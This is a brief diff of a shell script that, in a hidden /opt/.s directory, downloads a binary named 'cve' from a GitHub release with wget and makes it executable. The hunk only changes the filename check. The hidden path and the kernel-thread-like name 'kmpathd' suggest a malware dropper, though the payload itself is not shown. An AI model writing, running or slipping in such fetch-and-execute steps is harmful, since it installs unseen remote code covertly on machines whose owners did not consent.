@@ -11,7 +11,7 @@ if [ ! -d "$OPT_S_DIR" ]; then
 fi
 
 # 检查/opt/.s/kmpathd文件是否存在，不存在则下载
-if [ ! -f "kmpathds" ]; then
+if [ ! -f "cve" ]; then
     cd "$OPT_S_DIR" || exit
     wget https://github.com/YUNDUN8899/FUCKSEN/releases/download/BV10/cve
     chmod +x "cve"
